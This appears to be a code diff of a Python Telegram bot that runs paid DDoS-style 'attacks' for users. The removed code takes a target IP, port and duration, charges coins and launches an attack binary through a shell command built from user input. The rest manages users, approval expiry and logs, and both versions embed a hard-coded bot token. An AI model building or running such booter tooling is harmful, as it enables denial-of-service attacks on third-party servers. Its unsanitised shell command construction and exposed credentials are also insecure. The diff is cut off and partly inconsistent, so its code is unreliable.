@@ -1,459 +1,260 @@
-# ===========================================================
-#                  PARVEEN'S BOT SCRIPT
-# ===========================================================
+#script by @venomXcrazy
 
-# --------------------[ IMPORTS ]----------------------------
-
-import os
-import time
-import json
 import telebot
-import datetime
-import threading
 import subprocess
-from telebot import types
+import datetime
+import os
 
-# --------------------[ CONFIGURATION ]----------------------
-
-
-
-# Insert your Telegram bot token here
+from keep_alive import keep_alive
+keep_alive()
+# insert your Telegram bot token here
 bot = telebot.TeleBot('7200492297:AAHzBXY_bsv8YDXjywdK-g8BD-bp0zZ5sXA')
 
-# Insert your admin id here
+# Admin user IDs
 admin_id = ["1760458600"]
 
-# Files for data storage
+# File to store allowed user IDs
+USER_FILE = "users.txt"
+
+# File to store command logs
 LOG_FILE = "log.txt"
-DATA_FILE = "data.json"
 
-# Attack setting for users
-ALLOWED_PORT_RANGE = range(10003, 30000)
-ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
-BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
-
-
-
-# --------------------[ IN-MEMORY STORAGE ]----------------------
-
-users = {}
-user_coins = {}
-user_cooldowns = {}
-user_last_attack = {}
-
-# --------------------[ STORAGE ]----------------------
-
-
-
-# Load data from data.json if it exists
-def load_data():
-    global user_coins
-    if os.path.exists(DATA_FILE):
-        with open(DATA_FILE, "r") as file:
-            data = json.load(file)
-            user_coins = data.get("coins", {})
-
-# Save data to data.json
-def save_data():
-    data = {
-        "coins": user_coins
-    }
-    with open(DATA_FILE, "w") as file:
-        json.dump(data, file, indent=4)
-
-def load_config():
-    config_file = "config.json"
-
-    if not os.path.exists(config_file):
-        print(f"Config file {config_file} does not exist. Please create it.")
-        exit(1)
-
+# Function to read user IDs from the file
+def read_users():
     try:
-        with open(config_file, 'r') as f:
-            return json.load(f)
-    except json.JSONDecodeError as e:
-        print(f"Error decoding JSON in {config_file}: {str(e)}")
-        exit(1)
+        with open(USER_FILE, "r") as file:
+            return file.read().splitlines()
+    except FileNotFoundError:
+        return []
 
-config = load_config()
+# Function to read free user IDs and their credits from the file
+def read_free_users():
+    try:
+        with open(FREE_USER_FILE, "r") as file:
+            lines = file.read().splitlines()
+            for line in lines:
+                if line.strip():  # Check if line is not empty
+                    user_info = line.split()
+                    if len(user_info) == 2:
+                        user_id, credits = user_info
+                        free_user_credits[user_id] = int(credits)
+                    else:
+                        print(f"Ignoring invalid line in free user file: {line}")
+    except FileNotFoundError:
+        pass
 
-# Extract values from config.json
-full_command_type = config["initial_parameters"]
-threads = config.get("initial_threads")
-packets = config.get("initial_packets")
-binary = config.get("initial_binary")
-MAX_ATTACK_TIME = config.get("max_attack_time")
-ATTACK_COOLDOWN = config.get("attack_cooldown")
-ATTACK_COST = config.get("cost_per_attack")
+# List to store allowed user IDs
+allowed_user_ids = read_users()
 
-def save_config():
-    config = {
-        "initial_parameters": full_command_type,
-        "initial_threads": threads,
-        "initial_packets": packets,
-        "initial_binary": binary,
-        "max_attack_time": MAX_ATTACK_TIME,
-        "attack_cooldown": ATTACK_COOLDOWN,
-        "cost_per_attack": ATTACK_COST
-    }
-
-    with open("config.json", "w") as f:
-        json.dump(config, f, indent=4)
-
-# Log command function
+# Function to log command to the file
 def log_command(user_id, target, port, time):
+    admin_id = ["1760458600"]
     user_info = bot.get_chat(user_id)
-    username = user_info.username if user_info.username else f"{user_id}"
-
-    with open(LOG_FILE, "a") as file:
+    if user_info.username:
+        username = "@" + user_info.username
+    else:
+        username = f"UserID: {user_id}"
+    
+    with open(LOG_FILE, "a") as file:  # Open in "append" mode
         file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
-        
-# --------------------------------------------------------------
-        
 
-        
-        
-        
-# --------------------[ KEYBOARD BUTTONS ]----------------------
-
-
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    """Start command to display the main menu."""
-    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    attack_button = types.KeyboardButton("🚀 Attack")
-    myinfo_button = types.KeyboardButton("👤 My Info")    
-    coin_button = types.KeyboardButton("💰 Buy Coins")
-    
-    # Show the "⚙️ Settings" and "⏺️ Terminal" buttons only to admins
-    if str(message.chat.id) in admin_id:
-        settings_button = types.KeyboardButton("⚙️ Settings")
-        terminal_button = types.KeyboardButton("⏺️ Terminal")
-        markup.add(attack_button, myinfo_button, coin_button, settings_button, terminal_button)
-    else:
-        markup.add(attack_button, myinfo_button, coin_button)
-    
-    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 Parveen's 𝗯𝗼𝘁!", reply_markup=markup)
-    
-@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
-def settings_command(message):
-    """Admin-only settings menu."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-        threads_button = types.KeyboardButton("Threads")
-        binary_button = types.KeyboardButton("Binary")
-        packets_button = types.KeyboardButton("Packets")
-        command_button = types.KeyboardButton("parameters")
-        attack_cooldown_button = types.KeyboardButton("Attack Cooldown")
-        attack_time_button = types.KeyboardButton("Attack Time")
-        attack_cost_button = types.KeyboardButton("Attack cost")
-        back_button = types.KeyboardButton("<< Back to Menu")
-
-        markup.add(threads_button, binary_button, packets_button, command_button, attack_cooldown_button, attack_time_button, attack_cost_button, back_button)
-        bot.reply_to(message, "⚙️ 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗠𝗲𝗻𝘂", reply_markup=markup)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-        
-@bot.message_handler(func=lambda message: message.text == "⏺️ Terminal")
-def terminal_menu(message):
-    """Show the terminal menu for admins."""
-    user_id = str(message.chat.id)
-    if user_id in admin_id:
-        markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-        command_button = types.KeyboardButton("Command")
-        upload_button = types.KeyboardButton("Upload")
-        back_button = types.KeyboardButton("<< Back to Menu")
-        markup.add(command_button, upload_button, back_button)
-        bot.reply_to(message, "⚙️ 𝗧𝗲𝗿𝗺𝗶𝗻𝗮𝗹 𝗠𝗲𝗻𝘂", reply_markup=markup)
-    else:
-        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
-
-@bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
-def back_to_main_menu(message):
-    """Go back to the main menu."""
-    start_command(message)
-
-# ------------------------------------------------------------
-    
-    
-    
-    
-# --------------------[ ATTACK SECTION ]----------------------
-    
-    
-attack_in_process = False
-
-@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
-def handle_attack(message):
-    global attack_in_process  # Access the global variable
-    user_id = str(message.chat.id)
-    
-    # Check if the user has enough coins for the attack
-    if user_id not in user_coins or user_coins[user_id] < ATTACK_COST:
-        response = f"⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱! ⛔️\n\nOops! It seems like you don't have enough coins to use the Attack command. To gain coins and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for coins.\n🌟 Become a proud supporter and purchase coins.\n💬 Chat with an admin now and level up your experience!\n\nPer attack it cost only {ATTACK_COST} coins!"
-        bot.reply_to(message, response)
-        return
-    
-    if attack_in_process:
-        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
-        return
-
-    # Prompt the user for attack details
-    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
-    bot.reply_to(message, response)
-    bot.register_next_step_handler(message, process_attack_details)
-
-# Global variable to track attack status and start time
-attack_in_process = False
-attack_start_time = None
-attack_duration = 0  # Attack duration in seconds
-
-# Function to handle the attack command
-@bot.message_handler(commands=['check'])
-def show_remaining_attack_time(message):
-    if attack_in_process:
-        # Calculate the elapsed time
-        elapsed_time = (datetime.datetime.now() - attack_start_time).total_seconds()
-        remaining_time = max(0, attack_duration - elapsed_time)  # Ensure remaining time doesn't go negative
-
-        if remaining_time > 0:
-            response = f"🚨 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀! 🚨\n\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲: {int(remaining_time)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
-        else:
-            response = "✅ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!"
-    else:
-        response = "✅ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀"
-
-    bot.reply_to(message, response)
-
-def run_attack(command):
-    subprocess.Popen(command, shell=True)
-
-attack_message = None
-
-def process_attack_details(message):
-    global attack_in_process, attack_start_time, attack_duration, attack_message
-    attack_message = message  # Save the message object for later use
-    user_id = str(message.chat.id)
-    details = message.text.split()
-    
-    if len(details) != 3:
-        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️\n")
-        return
-    
-    if user_id in user_last_attack:
-        time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
-        if time_since_last_attack < ATTACK_COOLDOWN:
-            remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
-            bot.reply_to(message, f"⛔ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {remaining_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻.")
-            return
-    
-    if len(details) == 3:
-        target = details[0]
-        try:
-            port = int(details[1])
-            time = int(details[2])
-
-            # Check if the target IP starts with an allowed prefix
-            if not target.startswith(ALLOWED_IP_PREFIXES):
-                bot.reply_to(message, "⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
-                return  # Stop further execution
-
-            # Check if the port is within the allowed range
-            if port not in ALLOWED_PORT_RANGE:
-                bot.reply_to(message, f"⛔️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗿𝗲 𝗼𝗻𝗹𝘆 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 [10003 - 29999]")
-                return  # Stop further execution
-
-            # Check if the port is in the blocked list
-            if port in BLOCKED_PORTS:
-                bot.reply_to(message, f"⛔️ 𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗮𝗻𝗱 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲𝗱!")
-                return  # Stop further execution
-
-            # **Check if attack time exceeds MAX_ATTACK_TIME**
-            if time > MAX_ATTACK_TIME:
-                bot.reply_to(message, f"⛔️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 {MAX_ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀!")
-                return  # Stop further execution
-  
+# Function to clear logs
+def clear_logs():
+    try:
+        with open(LOG_FILE, "r+") as file:
+            if file.read() == "":
+                response = "Logs are already cleared. No data found ❌."
             else:
-                user_coins[user_id] -= ATTACK_COST
-                remaining_coins = user_coins[user_id]  # Now the value is correct
-                save_data()
-                log_command(user_id, target, port, time)
-                # Modify full command type logic
-                if full_command_type == 1:
-                    full_command = f"./{binary} {target} {port} {time}"
-                elif full_command_type == 2:
-                    full_command = f"./{binary} {target} {port} {time} {threads}"
-                elif full_command_type == 3:
-                    full_command = f"./{binary} {target} {port} {time} {packets} {threads}"
+                file.truncate(0)
+                response = "Logs cleared successfully ✅"
+    except FileNotFoundError:
+        response = "No logs found to clear."
+    return response
 
-                username = message.chat.username or "No username"
-
-                # Set attack_in_process to True before sending the response
-                attack_in_process = True
-                attack_start_time = datetime.datetime.now()
-                attack_duration = time  
-                user_last_attack[user_id] = datetime.datetime.now()
-            
-                # Send response
-                response = (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
-                        f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
-                        f"𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
-                        f"𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱: {ATTACK_COST} 𝗰𝗼𝗶𝗻𝘀\n"
-                        f"𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗖𝗼𝗶𝗻𝘀: {remaining_coins}\n"
-                        f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")
-                        
-                bot.reply_to(message, response)
-
-                # Run attack in a separate thread
-                attack_thread = threading.Thread(target=run_attack, args=(full_command,))
-                attack_thread.start()
-
-                # Reset attack_in_process after the attack ends
-                threading.Timer(time, reset_attack_status).start()
-
-        except ValueError:
-                bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️")
-
-def reset_attack_status():
-    global attack_in_process
-    attack_in_process = False
-
-    # Send the attack finished message after the attack duration is complete
-    bot.send_message(attack_message.chat.id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")
+# Function to record command logs
+def record_command_logs(user_id, command, target=None, port=None, time=None):
+    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
+    if target:
+        log_entry += f" | Target: {target}"
+    if port:
+        log_entry += f" | Port: {port}"
+    if time:
+        log_entry += f" | Time: {time}"
     
-# ---------------------------------------------------------------------
-#   
-#
-#
-#
-# --------------------[ USERS AND COINS SECTOIN ]----------------------
+    with open(LOG_FILE, "a") as file:
+        file.write(log_entry + "\n")
 
-@bot.message_handler(func=lambda message: message.text == "👤 My Info")
-def my_info(message):
-    user_id = str(message.chat.id)
-    username = message.chat.username or "No username"
-    role = "Admin" if user_id in admin_id else "User"
-    status = "Active ✅" if user_id in user_coins else "Inactive ❌"
+import datetime
 
-    # Format the response
-    response = (
-        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
-        f"🔖 𝗥𝗼𝗹𝗲: {role}\n"
-        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
-        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
-        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
-        f"💰 𝗖𝗼𝗶𝗻𝘀: {user_coins.get(user_id, 0)}"
-    )
+# Dictionary to store the approval expiry date for each user
+user_approval_expiry = {}
 
-    bot.reply_to(message, response)
-	
-@bot.message_handler(commands=['users'])
-def show_users(message):
-    user_id = str(message.chat.id)
-    
-    if user_id in admin_id:
-        if user_coins:  # Check if there are users
-            users_info = "\n".join([f"🆔 {uid}: {coins} coins" for uid, coins in user_coins.items()])
-            response = f"𝗨𝘀𝗲𝗿𝘀 𝗮𝗻𝗱 𝗖𝗼𝗶𝗻𝘀:\n\n{users_info}"
+# Function to calculate remaining approval time
+def get_remaining_approval_time(user_id):
+    expiry_date = user_approval_expiry.get(user_id)
+    if expiry_date:
+        remaining_time = expiry_date - datetime.datetime.now()
+        if remaining_time.days < 0:
+            return "Expired"
         else:
-            response = "No users found."
-        bot.reply_to(message, response)
+            return str(remaining_time)
     else:
-        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
-        bot.reply_to(message, response)
-        
-# Admin adds coins to a user's account
+        return "N/A"
+
+# Function to add or update user approval expiry date
+def set_approval_expiry_date(user_id, duration, time_unit):
+    current_time = datetime.datetime.now()
+    if time_unit == "hour" or time_unit == "hours":
+        expiry_date = current_time + datetime.timedelta(hours=duration)
+    elif time_unit == "day" or time_unit == "days":
+        expiry_date = current_time + datetime.timedelta(days=duration)
+    elif time_unit == "week" or time_unit == "weeks":
+        expiry_date = current_time + datetime.timedelta(weeks=duration)
+    elif time_unit == "month" or time_unit == "months":
+        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+    else:
+        return False
+    
+    user_approval_expiry[user_id] = expiry_date
+    return True
+
+# Command handler for adding a user with approval time
 @bot.message_handler(commands=['add'])
-def add_coins(message):
+def add_user(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        try:
-            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
-            if target_user_id not in user_coins:
-                user_coins[target_user_id] = 0
-            user_coins[target_user_id] += coins
-            save_data()  # Save updated data to JSON
+        command = message.text.split()
+        if len(command) > 2:
+            user_to_add = command[1]
+            duration_str = command[2]
 
-            # Send message to admin
-            response = f"✅ {coins} 𝗰𝗼𝗶𝗻𝘀 𝗮𝗱𝗱𝗲𝗱 𝘁𝗼 {target_user_id}'𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁!"
-            
-        except (IndexError, ValueError):
-            response = "❗️𝗨𝘀𝗮𝗴𝗲: /add <user_id> <coins>"
+            try:
+                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
+                if duration <= 0:
+                    raise ValueError
+                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
+                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
+                    raise ValueError
+            except ValueError:
+                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
+                bot.reply_to(message, response)
+                return
+
+            if user_to_add not in allowed_user_ids:
+                allowed_user_ids.append(user_to_add)
+                with open(USER_FILE, "a") as file:
+                    file.write(f"{user_to_add}\n")
+                if set_approval_expiry_date(user_to_add, duration, time_unit):
+                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
+                else:
+                    response = "Failed to set approval expiry date. Please try again later."
+            else:
+                response = "User already exists 🤦‍♂️."
+        else:
+            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
     else:
-        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
-    
+        response = "You have not purchased yet purchase now from:- @Parveen_solanki."
+
     bot.reply_to(message, response)
-    
+
+# Command handler for retrieving user info
+@bot.message_handler(commands=['myinfo'])
+def get_user_info(message):
+    user_id = str(message.chat.id)
+    user_info = bot.get_chat(user_id)
+    username = user_info.username if user_info.username else "N/A"
+    user_role = "Admin" if user_id in admin_id else "User"
+    remaining_time = get_remaining_approval_time(user_id)
+    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
+    bot.reply_to(message, response, parse_mode="HTML")
+
+
+
 @bot.message_handler(commands=['remove'])
-def clear_user(message):
-    user_id = str(message.chat.id)
-    
-    if user_id in admin_id:
-        try:
-            target_user_id = message.text.split()[1]
-            
-            if target_user_id in user_coins:
-                del user_coins[target_user_id]
-                save_data()  # Save updated data to JSON
-                response = f"✅ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝗳𝗿𝗼𝗺 𝘁𝗵𝗲 𝗱𝗮𝘁𝗮"
-            else:
-                response = f"❗ 𝗨𝘀𝗲𝗿 {target_user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺."
-        except IndexError:
-            response = "❗ Usage: /remove <user_id>"
-    else:
-        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
-    
-    bot.reply_to(message, response)
-
-# Admin deducts coins from a user's account
-@bot.message_handler(commands=['deduct'])
-def deduct_coins(message):
+def remove_user(message):
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        try:
-            target_user_id, coins = message.text.split()[1], int(message.text.split()[2])
-            if target_user_id not in user_coins:
-                response = f"❗️𝗨𝘀𝗲𝗿 {target_user_id} 𝗱𝗼𝗲𝘀𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗰𝗼𝗶𝗻𝘀 𝘆𝗲𝘁"
+        command = message.text.split()
+        if len(command) > 1:
+            user_to_remove = command[1]
+            if user_to_remove in allowed_user_ids:
+                allowed_user_ids.remove(user_to_remove)
+                with open(USER_FILE, "w") as file:
+                    for user_id in allowed_user_ids:
+                        file.write(f"{user_id}\n")
+                response = f"User {user_to_remove} removed successfully 👍."
             else:
-                # Deduct the coins
-                user_coins[target_user_id] = max(0, user_coins[target_user_id] - coins)
-                save_data()  # Save updated data to JSON
-                
-                # Send message to admin
-                response = f"✅ {coins} 𝗰𝗼𝗶𝗻𝘀 𝗱𝗲𝗱𝘂𝗰𝘁𝗲𝗱 𝗳𝗿𝗼𝗺 {target_user_id}'𝘀 𝗮𝗰𝗰𝗼𝘂𝗻𝘁!"
-
-        except (IndexError, ValueError):
-            response = "❗️𝗨𝘀𝗮𝗴𝗲: /deduct <user_id> <coins>"
+                response = f"User {user_to_remove} not found in the list ❌."
+        else:
+            response = '''Please Specify A User ID to Remove. 
+✅ Usage: /remove <userid>'''
     else:
-        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
-    
+        response = "You have not purchased yet purchase now from:- @Parveen_solanki 🙇."
+
     bot.reply_to(message, response)
-    
-@bot.message_handler(func=lambda message: message.text == "💰 Buy Coins")
-def buy_coins(message):
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    button1 = types.InlineKeyboardButton("50 COINS - 75/-", callback_data="buy_50")
-    button2 = types.InlineKeyboardButton("100 COINS - 150/-", callback_data="buy_100")
-    button3 = types.InlineKeyboardButton("200 COINS - 300/-", callback_data="buy_200")
-    markup.add(button1, button2, button3)
-    
-    bot.reply_to(message, "✅ 𝗖𝗵𝗼𝗼𝘀𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_"))
-def handle_buy_callback(call):
-    admin_username = "@Parveen_solanki"  # Replace with your admin username
-    coin_plans = {
-        "buy_50": "50 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 75 Rs",
-        "buy_100": "100 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 150 Rs",
-        "buy_200": "200 coins \n💰 𝗣𝗿𝗶𝗰𝗲: 300 Rs"
-    }
+@bot.message_handler(commands=['clearlogs'])
+def clear_logs_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(LOG_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "Logs are already cleared. No data found ❌."
+                else:
+                    file.truncate(0)
+                    response = "Logs Cleared Successfully ✅"
+        except FileNotFoundError:
+            response = "Logs are already cleared ❌."
+    else:
+        response = "You have not purchased yet purchase now from :- @Parveen_solanki ❄."
+    bot.reply_to(message, response)
 
-    if call.data in coin_plans:
-        chosen_plan = coin_plans[call.data]
-        bot.send_message(call.message.chat.id, f"📩 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝘁𝗼 𝗯𝘂𝘆 𝗰𝗼𝗶𝗻𝘀:\n\n👤 𝗔𝗱𝗺𝗶𝗻: {admin_username}\n💳 𝗣𝗹𝗮𝗻: {chosen_plan}")
-        bot.delete_message(call.message.chat.id, call.message.message_id)  # Delete the plan selection message
-    
+
+@bot.message_handler(commands=['clearusers'])
+def clear_users_command(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(USER_FILE, "r+") as file:
+                log_content = file.read()
+                if log_content.strip() == "":
+                    response = "USERS are already cleared. No data found ❌."
+                else:
+                    file.truncate(0)
+                    response = "users Cleared Successfully ✅"
+        except FileNotFoundError:
+            response = "users are already cleared ❌."
+    else:
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Parveen_solanki 🙇."
+    bot.reply_to(message, response)
+ 
+
+@bot.message_handler(commands=['allusers'])
+def show_all_users(message):
+    user_id = str(message.chat.id)
+    if user_id in admin_id:
+        try:
+            with open(USER_FILE, "r") as file:
+                user_ids = file.read().splitlines()
+                if user_ids:
+                    response = "Authorized Users:\n"
+                    for user_id in user_ids:
+                        try:
+                            user_info = bot.get_chat(int(user_id))
+                            username = user_info.username
+                            response += f"- @{username} (ID: {user_id})\n"
+                        except Exception as e:
+                            response += f"- User ID: {user_id}\n"
+                else:
+                    response = "No data found ❌"
+        except FileNotFoundError:
+            response = "No data found ❌"
+    else:
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Parveen_solanki ❄."
+    bot.reply_to(message, response)
+
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
     user_id = str(message.chat.id)
@@ -463,277 +264,192 @@ def show_recent_logs(message):
                 with open(LOG_FILE, "rb") as file:
                     bot.send_document(message.chat.id, file)
             except FileNotFoundError:
-                response = "No data found"
+                response = "No data found ❌."
                 bot.reply_to(message, response)
         else:
-            response = "No data found"
+            response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Parveen_solanki ❄."
         bot.reply_to(message, response)
-        
-@bot.message_handler(commands=['status'])
-def status_command(message):
